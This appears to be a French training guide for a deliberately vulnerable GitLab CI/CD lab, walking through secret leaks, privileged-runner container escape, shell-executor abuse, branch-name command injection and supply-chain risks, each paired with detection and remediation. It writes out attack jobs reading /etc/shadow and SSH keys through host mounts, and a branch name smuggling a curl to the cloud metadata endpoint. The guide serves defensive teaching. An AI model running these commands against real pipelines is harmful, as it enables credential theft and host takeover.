# Scénarios de sécurité CI/CD — `vuln-pipeline`

Ce projet est une cible d'entraînement. Chaque scénario : objectif → profil à
activer → comment le reproduire/exploiter → comment le détecter → comment
corriger. Tout reste confiné au réseau `192.168.56.0/24`.

Chaque scénario correspond à un **profil de lab** (voir README « Profils de
risque »), pour ne pas exposer tous les risques en même temps :

```bash
LAB_PROFILE=<profil> vagrant provision runner
```

| Profil | Scénario(s) couverts |
|---|---|
| `default` | Aucun — référence "pipeline sain" pour comparer |
| `secrets-leak` | Scénario 1 |
| `docker-priv` | Scénario 2 |
| `shell-exec` | Scénario 3 |
| `full-vulnerable` | Scénarios 1 à 5 cumulés |

## Cartographie des faiblesses volontaires

| # | Faiblesse                                   | Profil |
|---|----------------------------------------------|----|
| 1 | Secrets en clair dans le dépôt/pipeline       | `secrets-leak`, `full-vulnerable` |
| 2 | Injection de commande via variable CI         | `shell-exec`, `full-vulnerable` |
| 3 | `curl \| sh` (exécution de script distant non vérifié) | `full-vulnerable` |
| 4 | Artefacts sensibles exportés, jamais expirés  | `secrets-leak`, `full-vulnerable` |
| 5 | Runner **privileged** + socket Docker monté   | `docker-priv`, `full-vulnerable` |
| 6 | Runner **shell executor** (== accès VM hôte)  | `shell-exec`, `full-vulnerable` |
| 7 | Pas de `rules:` sur un job de déploiement      | `secrets-leak`, `full-vulnerable` |
| 8 | Secret affiché en clair dans les logs + `env \| sort` | `secrets-leak`, `full-vulnerable` |
| 9 | Variable CI non protégée utilisable hors `main` | `secrets-leak`, `full-vulnerable` |
| 10| App vulnérable : injection SQL, injection de commande, `yaml.load`, `debug=True` | toujours présent (`app/app.py`) |
| 11| Dépendances obsolètes/vulnérables             | `requirements.txt` (Flask 1.0, Jinja2 2.10...) |
| 12| IaC non sécurisée (SG ouvert, bucket public)  | `terraform/main.tf` |

## Scénario 1 — Fuite de secrets CI via Merge Request

**Profil requis** : `LAB_PROFILE=secrets-leak vagrant provision runner` (ou `full-vulnerable`)

**Objectif** : montrer qu'une variable CI non protégée fuite dès qu'un
contributeur peut déclencher un pipeline sur sa branche.

1. Connectez-vous en `dev`, forkez/créez une branche sur `vuln-pipeline`.
2. Modifiez le job `deploy` pour afficher `echo $PROD_DEPLOY_TOKEN | base64`.
3. Ouvrez une MR → le pipeline tourne (pas de `rules:` restrictif) → le token
   apparaît dans les logs, lisibles par tout membre du projet.
4. **Détection** : scanner les logs de pipeline (`gitleaks` peut aussi scanner
   des dumps de logs), activer le masquage des variables (`masked: true` —
   impossible ici car la valeur ne respecte pas le format exigé, à corriger).
5. **Remédiation** : marquer `PROD_DEPLOY_TOKEN` en `protected: true` +
   `masked: true`, restreindre son environnement, ajouter
   `rules: - if: $CI_COMMIT_BRANCH == "main"` sur `deploy`, et limiter qui peut
   pousser/merger sur `main` (Protected Branches, "No one" en force-push).

## Scénario 2 — Évasion de conteneur via runner privilégié

**Profil requis** : `LAB_PROFILE=docker-priv vagrant provision runner` (ou `full-vulnerable`)

**Objectif** : montrer le risque du tag `docker-priv` (`privileged: true` +
`/var/run/docker.sock` monté) — accès root à l'hôte runner depuis un job.

1. Ajoutez un job de test taggé `docker-priv` :
   ```yaml
   pwn-privileged:
     tags: [docker-priv]
     image: docker:27
     script:
       - docker run --rm -v /:/hostfs alpine chroot /hostfs cat /etc/shadow
   ```
2. Lancez le pipeline : le job lit `/etc/shadow` de la **VM runner hôte**
   depuis un conteneur — preuve d'évasion complète.
3. **Détection** : audit de `/etc/gitlab-runner/config.toml` (repérer
   `privileged = true`, volumes montant `docker.sock` ou `/`), règle
   `checkov`/`kics` sur la configuration du runner, alerter sur tout job
   utilisant ce tag sans justification.
4. **Remédiation** : supprimer `docker-priv` en production ; si le
   Docker-in-Docker est nécessaire, utiliser `docker:dind` **non privilégié**
   avec `kaniko` ou `buildah` pour construire des images sans privilèges
   étendus ; restreindre les tags autorisés par projet (Protected Runners,
   CI/CD → Runners → "This runner can be used on protected branches only"),
   et ne jamais lier un runner partagé en `privileged` à des dépôts publics.

## Scénario 3 — Shell executor = accès direct à la VM runner

**Profil requis** : `LAB_PROFILE=shell-exec vagrant provision runner` (ou `full-vulnerable`)

**Objectif** : le tag `shell` exécute les jobs directement comme l'utilisateur
`gitlab-runner` sur l'hôte (pas d'isolation conteneur), et ce user est dans
`docker` → équivalent root.

1. Job de test taggé `shell` :
   ```yaml
   pwn-shell:
     tags: [shell]
     script:
       - whoami; id
       - docker run --rm -v /:/hostfs alpine cat /hostfs/root/.ssh/id_rsa 2>/dev/null || true
       - sudo -n cat /etc/shadow 2>/dev/null || echo "sudo refusé (attendu)"
   ```
2. Observez que `id` montre l'appartenance au groupe `docker`, donc capacité
   à monter n'importe quel chemin de l'hôte via un conteneur — même constat
   que le scénario 2, par un autre chemin.
3. **Remédiation** : éviter le shell executor pour du code non fiable ;
   sinon, exécuter `gitlab-runner` sans l'ajouter au groupe `docker`, isoler
   via des VMs jetables ou des conteneurs rootless, et réserver ces runners
   aux projets de confiance via Protected Runners.

## Scénario 4 — Injection de commande via variables contrôlées par l'attaquant

**Profil requis** : `shell-exec` ou `full-vulnerable`

**Objectif** : `CI_COMMIT_REF_NAME` (nom de branche), les titres de MR, ou des
variables définies dans `.gitlab-ci.yml` d'une MR externe sont sous contrôle
d'un attaquant externe quand ils sont interpolés dans un shell.

1. Créez une branche nommée :
   `main$(curl${IFS}http://169.254.169.254/latest/meta-data/)` (ou plus
   simple dans le lab : `` main`id` ``).
2. Poussez, observez dans les logs du job `build` que la sous-commande
   s'exécute (le nom de branche est interpolé tel quel dans `bash -c`).
3. **Détection** : règle Semgrep `p/gitlab` (incluse) détecte l'usage de
   variables CI non neutralisées dans `script:`; revue manuelle de tout
   `bash -c "...$CI_..."`.
4. **Remédiation** : ne jamais interpoler une variable CI dans une chaîne
   shell exécutée avec `-c`/`eval`; utiliser les variables comme arguments
   positionnels (`"$VAR"` entre guillemets, sans `-c`), ou les valider contre
   une regex stricte avant usage.

## Scénario 5 — Supply chain : `curl | sh` et dépendances non épinglées

**Profil requis** : `full-vulnerable`

1. Le job `build` exécute un script distant sans vérification d'intégrité, et
   `Dockerfile` installe depuis `requirements.txt` sans hash ni version
   capée pour certains paquets.
2. Lancez `vuln-trivy` et `sast-semgrep` (inclus dans `ci/security-scans.yml`)
   et consultez les rapports JSON en artefacts.
3. **Remédiation** : épingler versions + hashes (`pip install --require-hashes`
   ou `pip-compile`), vérifier les checksums/signatures des scripts tiers,
   interdire `curl | sh` par policy (`checkov`/`semgrep` custom rule), publier
   un SBOM (`syft`) en artefact de pipeline.

## Scénario 6 — Durcissement : rejouer le lab "corrigé"

Après avoir exploité un ou plusieurs scénarios, repassez en profil sain :

```bash
LAB_PROFILE=default vagrant provision runner
```

Ceci dérégistre automatiquement les runners `docker-priv`/`shell`, repousse
la variante propre de `.gitlab-ci.yml` sur `vuln-pipeline` et supprime les
variables CI sensibles créées par le profil précédent — comparez les deux
pipelines (`default` vs le profil exploité) pour voir l'effet des correctifs.

Pour aller plus loin, modifiez vous-même
`ansible/roles/gitlab_seed/files/projects/vuln-pipeline/ci-variants/default.yml` :
- Gardez les 5 scans (Gitleaks/Semgrep/Trivy/Hadolint/Checkov) en `stage:
  security`, passez-les en bloquants (`allow_failure: false`) une fois le
  bruit initial traité.
- Ajoutez des `rules:` et des `protected environments` sur `deploy`.
- Créez un profil personnalisé dans `ansible/group_vars/all.yml`
  (`lab_profiles:`) pour vos propres scénarios.

## Aller plus loin

- Activer le scanning officiel GitLab Ultimate-only à titre de comparaison
  (DAST, Container Scanning) si vous avez une licence d'essai.
- Ajouter OPA/Conftest pour imposer des policies `.gitlab-ci.yml` (ex :
  interdire `privileged: true`, forcer `rules:` sur tout job `deploy`).
- Simuler un compromis de runner partagé : un job malveillant qui tente de
  lire le cache/les artefacts d'un autre projet sur le même runner `shell`.
